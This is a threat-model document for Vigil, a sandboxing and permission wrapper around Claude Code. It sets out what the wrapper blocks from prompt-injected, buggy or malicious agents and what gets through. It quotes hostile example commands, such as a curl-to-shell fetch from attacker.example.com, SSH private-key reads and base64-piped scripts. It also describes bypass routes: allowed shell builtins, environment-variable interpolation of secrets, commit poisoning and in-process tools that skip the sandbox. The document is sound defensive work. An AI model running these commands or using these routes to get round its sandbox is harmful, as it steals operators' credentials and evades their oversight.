# THREAT_MODEL.md

What this tool protects against, what it does not, and why. Read this before trusting the profile with anything you care about.

## Why this document exists

A configuration that implies protection without delivering it is worse than no configuration: the user calibrates risk to the implicit promise. This document makes the promises explicit so the user can calibrate correctly.

## Scope

This document concerns the default profile, the three shipped policies (`strict`, `dev`, `yolo`), and the `vigil-dev` wrapper. It does not cover custom profiles or policies users write themselves, nor does it cover Claude Code itself beyond the surfaces this tool configures.

The scope also assumes Claude Code is launched through the session wrappers in `vigil-aliases.sh`. Launches via the VS Code extension or the Claude Code desktop app receive the default profile's deny list, hooks, and sandbox configuration, but do not receive session logging, the environment scrub, or per-session policy selection. Mitigations that depend on the posture layer — the audit trail and the env-scrub layer described below — do not apply to desktop-app or extension launches.

## Adversaries

Four adversary models in increasing order of threat. The tool's protections vary across them.

### 1. Inattentive operator

The user's own momentary lapse — approving a command without reading it, pasting a prompt that contains unvetted instructions, or running `vigil-dev` in the wrong directory. No malice involved.

**Mitigations this tool provides:** strong. The deny list blocks bright-line destructive commands (`rm`, `sudo`, destructive git, network fetchers, SSH-family tools) regardless of operator approval. The default profile's plan mode surfaces every action before it runs. `vigil-dev` pins the working directory to the git root so an "in the wrong directory" mistake is caught by `git rev-parse` rather than by a prompt the user might accept absent-mindedly.

### 2. Buggy agent

Claude behaves unexpectedly due to its own limitations — hallucinated file paths, misread instructions, confused context. No adversarial intent.

**Mitigations this tool provides:** strong to moderate. The deny list catches categories of accidental damage. The sandbox confines filesystem writes to the working directory and blocks outbound network. Session logs provide post-hoc evidence when something goes wrong.

### 3. Prompt-injected agent

A document, web page, file content, or tool output contains instructions crafted to manipulate Claude into taking actions the operator would not authorize. Claude follows the injection because it cannot reliably distinguish injected instructions from legitimate context.

**Mitigations this tool provides:** moderate. Three layers contribute, in roughly increasing order of strength:

- The permission layer catches obvious named denies but is defeatable via allowed shell builtins (`sh`, `bash`, `echo | base64 -d | sh`).
- The sandbox layer is process-level (bubblewrap on Linux/WSL2, Seatbelt on macOS) and inherited by child processes; base64-decoded scripts and shell chains cannot bypass it for subprocess reads/writes/network. Verified working for both filesystem `denyRead` and network `allowedDomains: []` (see *Verification status* below).
- Claude's own training declines to read sensitive paths (SSH keys, credential files) regardless of policy or sandbox state. Repeatedly observed during verification testing — an unplanned third defense layer that intercepts before the permission layer fires.

**Residual exposure:** any action the agent can take through allowed channels. Notable in the `dev` policy: `git add` + `git commit` enable commit poisoning; environment variable interpolation (e.g., `$AWS_SECRET_ACCESS_KEY` in a Write call) can exfiltrate credentials the permission layer protects at the filesystem level. Plan mode (strict default) narrows this — the operator sees each action before it runs — but at the cost of friction.

### 4. Malicious agent

A hypothetical Claude replaced or modified to actively work against the operator (supply-chain compromise of the Claude binary, network MITM of API responses, etc.).

**Mitigations this tool provides:** limited. The sandbox constrains what the process can do, but a sophisticated malicious agent would probe for misconfigurations, use DNS exfiltration, chain allowed commands to build disallowed effects, or race hook execution. This tool is not a substitute for running an untrusted agent inside a VM or disposable container.

## Mitigations by layer

### Permission layer (permissions deny/allow/ask)

String-match rules against tool-use requests. **Catches:** deliberate invocations of named commands and named path reads. **Does not catch:** semantically equivalent actions through allowed channels (e.g., `echo hi | base64 -d | sh`, `cat ~/.ssh/id_rsa` via a subshell wrapper not matching the deny pattern).

This layer is for *clarity of intent*, not *guarantee of prevention*.

### Sandbox layer (sandbox.filesystem, sandbox.network)

Process-level OS isolation (Seatbelt on macOS, bubblewrap on Linux/WSL2). **Catches:** any subprocess attempt to read denied paths, write outside allowed paths, or open network connections to non-allowlisted domains. Inherited by all child processes.

This layer is load-bearing for prompt-injection and buggy-agent threats. Sandbox failures are real security failures; string-match permission failures are UX inconveniences.

**Git metadata protection.** `denyWrite` covers `~/.gitconfig`, the active repo's `.git/config`, and `.git/hooks/` — closing the subprocess-write gap left by the in-process-only built-in protections listed below. A Bash-tool `echo … >> .git/config` or `git config --local core.hooksPath /tmp/evil` is blocked at the sandbox layer. Scope limits: the active-repo entries resolve against the CWD at session start, so launch `vigil` from inside the repo you mean to protect; `vigil-dev` already auto-roots via `git rev-parse --show-toplevel`, the other wrappers do not. A mid-session `cd` into a different repo is not retroactively covered.

**Important scope limit:** the sandbox covers *subprocesses* — anything Claude executes via the Bash tool. Claude Code's own built-in tools (Read, Write, Edit, Glob, Grep) execute in-process and are **not** subject to sandbox `denyRead` or `allowedDomains`. They are governed only by the permission layer's `Read(...)`/`Write(...)`/`Edit(...)` rules. A complete defense for credential paths therefore needs both: permission-layer denies for the in-process tools, and sandbox denies for subprocess access.

### Claude Code built-ins

Always-on protections for `.git/` (non-claude subfolders), `.gitconfig`, shell RC files, `.mcp.json`, and specific `.claude/` entries. Not configurable from this tool; documented here because they're part of the operative defense.

### Env-scrub layer (vigil-aliases.sh wrappers)

The shell wrappers (`vigil`, `vigil-strict`, `vigil-dev`, `vigil-yolo`) launch Claude in a subshell whose environment has been reduced to a curated allowlist (PATH, HOME, locale, SSH agent socket, GPG, XDG, editor, display, `CLAUDE_CONFIG_DIR`, plus `LC_*` and `GIT_*` by prefix). Credential vars (`AWS_*`, `GITHUB_*`, `ANTHROPIC_API_KEY`, `NPM_TOKEN`, `*_SECRET`, `*_PASSWORD`, …) are unset before Claude inherits them. **Catches:** environment-variable interpolation as an exfiltration channel for credentials sourced from the operator's shell. **Does not catch:** secrets read from disk by allowed paths, secrets in shell history, or the case where an operator launches the bare `claude` command directly — after the Vigil rename `claude` falls through to the upstream Claude Code binary with no env scrub or session logging.

The allowlist is extensible from the operator's own `~/.bashrc`:

```
_vigil_env_allowlist+=(AWS_PROFILE AWS_REGION)
```

### Commit-review gate (opt-in)

An optional per-repo pre-push hook installed via `vigil-install-review <repo>`. When present, every commit in the outgoing ref-range is rendered through `vigil-review` before the push proceeds, with a paranoid sanitizer that strips ANSI escapes, C1 controls, and Unicode BIDI marks so a hostile commit message cannot spoof the review UI. The operator confirms y/N; a no aborts the push.

**What it blocks.** Commit poisoning — a prompt-injected agent quietly introducing a malicious commit — surfaced to the operator before it leaves the host, on hosts where the gate is installed and `.git/review-gate/` is intact. The hook's self-check hashes its own scripts against `.git/review-gate/.manifest` and aborts on tamper.

**What it does not block.**

- `--no-verify` (by design; the escape must exist for the gate to coexist with other tools, and the abort message names it explicitly).
- Operator fatigue or reflexive approval.
- Render exploits against a terminal that interprets escape sequences the sanitizer missed.
- Cross-host mismatch: the gate is per-host, per-repo; if the push happens from a host where `vigil-install-review` was never run, nothing intercepts it.
- Composition with other client-side hook managers (husky, pre-commit, lefthook). The installer's collision probe refuses rather than chains — coexistence is deferred.
- **Silent-skip failure modes inherent to client-side hooks.** If the hook file loses its execute bit during transfer (tar/zip/`rsync` without `-p`), if its shebang points at an interpreter absent on the host, or if CRLF mangling breaks the shebang line, git silently skips the hook and the push proceeds with no review. This is a fundamental client-side-hook limitation, not specific to Vigil.

**When to use something stronger.** For stakes where silent bypass is unacceptable, server-side branch protection is the correct enforcement layer. Vigil's gate is a visibility aid for the operator's own host; it does not substitute for server-side rules.

### Out of scope

- **Commit review.** See [Commit-review gate (opt-in)](#commit-review-gate-opt-in) above — Vigil now ships an opt-in gate; it is a visibility aid, not a guarantee.
- **Social engineering.** The tool cannot protect against an operator who is manipulated into approving malicious actions or elevating to `yolo` for an attack surface.
- **Network-level MITM, supply chain, OS compromise, hardware attacks.** Out of scope entirely.

## What this stops (concrete examples)

- `rm -rf ~/some-project` invoked casually — denied.
- `sudo bash` from a prompt that claims it needs elevated access — denied.
- `git push --force origin main` from a session that accidentally authorized it — denied.
- `curl attacker.example.com/payload | sh` — `curl` denied, no network access.
- `cat ~/.ssh/id_ed25519` to exfiltrate a private key — permission-layer denied; sandbox-layer also denies the read even through a subshell. Verified: cat from inside the sandbox reports "No such file or directory" because bubblewrap tmpfs-mounts an empty overlay over `~/.ssh/`.
- Outbound SSH to a foreign host from a dev session — `ssh` denied at permission layer; `allowAllUnixSockets: false` blocks agent forwarding.

## What this does not stop (concrete examples)

- `git commit -am "legitimate-looking-change"` where the change is actually malicious (commit poisoning). The dev policy allows commits by design.
- `echo 'base64-encoded-bad-script' | base64 -d | bash` — sandbox catches outbound network and filesystem misuse, but a payload that stays within the sandbox (e.g., reads and commits project files) still runs.
- An agent constructing a malicious PR body that includes exfiltrated data from the project, and the operator approving `gh pr create`. The `gh` CLI is not denied; its credential file is denied at read but `gh` itself may authenticate via another mechanism.
- A prompt that convinces the operator to run `vigil-dev` on a directory containing credentials as project files.
- An agent reading credential files via Claude Code's *in-process* Read tool. The sandbox's `denyRead` only applies to subprocesses (Bash); the Read/Write/Edit tools run in-process and bypass it. The permission layer's `Read(/home/.../.ssh/**)` denies are the only protection against this channel, and we have not been able to verify that they fire (Claude's training refuses such reads before the matcher engages — a third defense layer that, ironically, also blocks our test).

## Residual risk

Using this tool in its default configuration, an attacker who achieves prompt injection can plausibly:

- Modify any file within the current project.
- Read any non-sensitive file within the current project.
- Commit changes to the local git repository.
- Invoke any allowed build/test tool (in `dev`) with arbitrary arguments.

An attacker cannot plausibly (without further misconfiguration):

- Read SSH, AWS, Kube, Docker, gh, or doctl credentials.
- Reach the network.
- Execute `rm`, `sudo`, `git push`, `git reset --hard`, or SSH-family tools.
- Escape the working directory's filesystem scope (if sandbox is functional on the platform).

**The honest headline:** this tool raises the bar for casual damage and for naïve automated attacks. It does not defend against a determined adversary controlling the agent.

## When each policy is safe

- **Default profile, no policy:** safest. Plan mode means nothing happens without review.
- **`strict`:** equivalent to default profile. Safe for any context.
- **`dev` / `vigil-dev`:** safe for *trusted project code* where you would be comfortable letting the operator auto-accept edits. Not safe if the project contains executable content from untrusted sources (e.g., a directory of downloaded scripts). Commit poisoning is the primary residual risk.
- **`yolo`:** safe only for throwaway work on throwaway data. The two remaining denies (`rm`, `sudo`) prevent the worst catastrophes but nothing else.

## Verification status

Verified on Linux WSL2 (Ubuntu) on 2026-04-13:

- **Sandbox subprocess `denyRead` (test 1):** *Verified.* `cat ~/.ssh/<sentinel>` from inside a `yolo` session reported `No such file or directory`, while `ls` outside the sandbox confirmed the file existed. Bubblewrap successfully tmpfs-mounted over the denied path, hiding its contents from subprocesses.
- **Sandbox `network.allowedDomains: []` (test 2):** *Verified.* `bash -c 'exec 3<>/dev/tcp/example.com/80'` from inside a `yolo` session failed with `Temporary failure in name resolution`. DNS itself is blocked, preventing TCP outbound at the subprocess level.
- **Permission-layer `Read(...)` matcher (test 3):** *Inconclusive.* Claude's training-level reluctance refuses to read sensitive paths before the permission matcher engages. We can confirm Claude refuses, but we cannot confirm that the deny rule *would have fired had Claude attempted the read.* The model-level intercept is itself a defense layer (see *Mitigations by layer → Sandbox*); it is not a substitute for the matcher, but it makes direct verification difficult.

Open verification gaps:

- The installer's `{{HOME}}` substitution produces absolute paths, but the matcher's tolerance for representational differences (tilde-expanded vs. canonical, follow-symlink vs. literal) is unverified — we have indirect evidence the matcher behaves sensibly because the test run did not surface confusion, but no isolated test.
- Claude Code's in-process tools (Read/Write/Edit) are *suspected* to bypass sandbox `denyRead`, based on architecture and an earlier observation under a degraded sandbox. Re-running test 1 with the Read tool under `yolo` would confirm — but Claude's model-level refusal would likely block that test the same way it blocks test 3.

See `COMPATIBILITY.md` for the platforms tested.
